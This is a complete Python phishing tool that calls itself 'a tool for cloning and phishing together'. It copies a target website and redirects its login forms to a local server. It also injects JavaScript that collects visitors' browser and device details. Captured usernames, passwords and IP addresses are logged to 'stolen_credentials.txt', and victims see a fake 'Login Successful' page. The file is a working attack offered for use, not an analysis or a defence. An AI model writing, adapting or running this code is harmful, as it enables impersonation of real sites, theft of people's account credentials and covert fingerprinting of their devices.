import os
import requests
import argparse
from bs4 import BeautifulSoup
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
import socket
from colorama import Fore, Style, init

init(autoreset=True)

def display_banner():
    banner = '''                                                           

MM'""""'YMM dP                            MM"""""""`YM dP       oo          dP       
M' .mmm. `M 88                            MM  mmmmm  M 88                   88       
M  MMMMMooM 88 .d8888b. 88d888b. .d8888b. M'        .M 88d888b. dP .d8888b. 88d888b. 
M  MMMMMMMM 88 88'  `88 88'  `88 88ooood8 MM  MMMMMMMM 88'  `88 88 Y8ooooo. 88'  `88 
M. `MMM' .M 88 88.  .88 88    88 88.  ... MM  MMMMMMMM 88    88 88       88 88    88 
MM.     .dM dP `88888P' dP    dP `88888P' MM  MMMMMMMM dP    dP dP `88888P' dP    dP 
MMMMMMMMMMM                               MMMMMMMMMMMM                               
                                                                                                                                           
  '''
    print(Fore.BLUE + banner)
    print(Fore.GREEN + "Version: 1.0.0")
    print(Fore.RED + "Author: G4UR4V007")
    print(Fore.WHITE + "A tool for cloning and phishing together")
    print(Fore.YELLOW + "+" + "-"*33 + "+")

def fetch_html(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        return response.text
    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"Error fetching the page: {e}")
        return None

def save_cloned_html(url, html_content, folder):
    soup = BeautifulSoup(html_content, 'html.parser')
    for form in soup.find_all('form'):
        form['action'] = '/submit'
    
    script_tag = soup.new_tag('script')
    script_tag.string = '''
    document.addEventListener('DOMContentLoaded', function() {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', '/system-info', true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

        var systemInfo = {
            'User-Agent': navigator.userAgent,
            'Screen Resolution': screen.width + 'x' + screen.height,
            'Timezone': Intl.DateTimeFormat().resolvedOptions().timeZone,
            'Language': navigator.language
        };

        var data = [];
        for (var key in systemInfo) {
            if (systemInfo.hasOwnProperty(key)) {
                data.push(encodeURIComponent(key) + '=' + encodeURIComponent(systemInfo[key]));
            }
        }

        xhr.send(data.join('&'));
    });
    '''
    soup.head.append(script_tag)

    cloned_html_path = os.path.join(folder, 'index.html')
    with open(cloned_html_path, 'w', encoding='utf-8') as f:
        f.write(soup.prettify())
    
    return cloned_html_path

class PhishingHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        return

    def do_GET(self):
        if self.path == '/':
            with open('index.html', 'rb') as file:
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                self.wfile.write(file.read())

    def do_POST(self):
        if self.path == '/submit':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            parsed_data = parse_qs(post_data)
            username = parsed_data.get('username', [''])[0]
            password = parsed_data.get('password', [''])[0]
            client_ip = self.client_address[0]  # Capture the client IP address
            
            print(Fore.GREEN + "[+] Received credentials:")
            print(Fore.YELLOW + f"   Username: {username}")
            print(Fore.YELLOW + f"   Password: {password}")
            print(Fore.YELLOW + f"   IP Address: {client_ip}")

            with open("stolen_credentials.txt", "a") as f:
                f.write(f"Username: {username}\nPassword: {password}\nIP Address: {client_ip}\n")

            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(bytes("<html><body><h2>Login Successful</h2></body></html>", "utf8"))

        elif self.path == '/system-info':
            content_length = int(self.headers['Content-Length'])
            system_info = self.rfile.read(content_length).decode('utf-8')
            parsed_info = parse_qs(system_info)
            user_agent = parsed_info.get('User-Agent', [''])[0]
            screen_resolution = parsed_info.get('Screen Resolution', [''])[0]
            timezone = parsed_info.get('Timezone', [''])[0]
            language = parsed_info.get('Language', [''])[0]
            client_ip = self.client_address[0]  # Capture the client IP address

            print(Fore.BLUE + "[+] Received system info:")
            print(Fore.CYAN + f"   User-Agent: {user_agent}")
            print(Fore.CYAN + f"   Screen Resolution: {screen_resolution}")
            print(Fore.CYAN + f"   Timezone: {timezone}")
            print(Fore.CYAN + f"   Language: {language}")
            print(Fore.CYAN + f"   IP Address: {client_ip}")

            with open("system_info.txt", "a") as f:
                f.write(f"User-Agent: {user_agent}\nScreen Resolution: {screen_resolution}\nTimezone: {timezone}\nLanguage: {language}\nIP Address: {client_ip}\n")

            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"System info received")

def run_server(port=8080):
    ip_address = socket.gethostbyname(socket.gethostname())
    server_address = ('', port)
    httpd = HTTPServer(server_address, PhishingHandler)
    
    print(Fore.GREEN + f"Server started at http://{ip_address}:{port}/")
    print(Fore.GREEN + "Waiting for user input...")
    httpd.serve_forever()

def clone_and_host_website(url):
    html_content = fetch_html(url)
    if not html_content:
        print(Fore.RED + "Failed to clone the website.")
        return
    
    domain = urlparse(url).netloc
    folder = os.path.join(os.getcwd(), domain)
    if not os.path.exists(folder):
        os.makedirs(folder)

    save_cloned_html(url, html_content, folder)

    os.chdir(folder)
    run_server(port=8080)

def parse_args():
    parser = argparse.ArgumentParser(description="Clone a website and host it locally.")
    parser.add_argument('-d', '--domain', required=True, help="The domain of the website to clone.")
    return parser.parse_args()

if __name__ == "__main__":
    display_banner()
    args = parse_args()
    target_url = args.domain
    clone_and_host_website(target_url)
